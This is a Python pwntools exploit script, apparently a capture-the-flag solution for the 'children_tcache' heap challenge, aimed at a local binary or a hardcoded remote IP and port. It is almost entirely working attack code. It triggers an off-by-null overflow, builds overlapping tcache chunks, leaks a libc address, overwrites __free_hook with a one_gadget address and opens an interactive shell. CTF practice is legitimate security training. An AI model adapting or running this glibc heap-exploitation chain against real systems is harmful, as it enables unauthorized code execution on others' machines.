from pwn import *
binary='./children_tcache'
elf=ELF(binary)
#

struct="""
"""

f=open('peda-structs','w')
f.write(struct)
f.close()


ru=lambda x:r.recvuntil(x)
rv=lambda x:r.recv(x)
rl=lambda :r.recvline()
sn=lambda x:r.send(x)
sl=lambda x:r.sendline(x)
io=lambda :r.interactive()
sla=lambda x,y:r.sendlineafter(x,y)
sa=lambda x,y:r.sendafter(x,y)

context.clear(arch='amd64')
#context.clear(arch='i386')

def newheap(sz,data):
	sla("choice:","1")
	sla("Size:",str(sz))
	sa("Data:",data)

def delheap(idx):
	sla("choice:","3")
	sla("Index:",str(idx))
def show(idx):
	sla("choice:","2")
	sla("Index:",str(idx))

def main(C):
	global r
	if C=="1":
		r=process(binary,env={"LD_PRELOAD":""})
		libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
	elif C=="2":
		r=process(binary,env={"LD_PRELOAD":"./libc.so.6"})
		libc=ELF('./libc.so.6')
	else:
		r=remote("54.178.132.125",8763 )
		libc=ELF('./libc.so.6')
	newheap(0x1ff0,"A")
	newheap(0xff0,"A")
	delheap(0)
	newheap(0x108,"B".ljust(0x108,"B")) #trigger off by null 
	
	for i in xrange(8):
		newheap(0x100,"B")

	for i in xrange(3,10):
		delheap(i)
	delheap(2)
	delheap(0)
	#io()
	for i in xrange(8):
		newheap(0x100,"a")

	delheap(1) #overlap

	delheap(0)
	delheap(2)
	for i in xrange(3,8):
		delheap(i)
	newheap(0x1300,"A")
	newheap(0x870,"A"*0x868)
	newheap(0x550,"B")
	newheap(0x550,"CC")
	delheap(2)
	show(0)
	libc.address=u64(rl()[:-1].ljust(8,'\x00'))-0x3ebca0
	log.info("libc : " + hex(libc.address))
	delheap(1)

	newheap(0x111-0x20,"a") #1
	newheap(0x20,"A"*0x10+p64(libc.symbols['__free_hook']))
	newheap(0x100,"A")
	newheap(0x100,p64(libc.address+0x4f322)) #5
	delheap(1)
	io()


if __name__=="__main__":
	main(sys.argv[1])


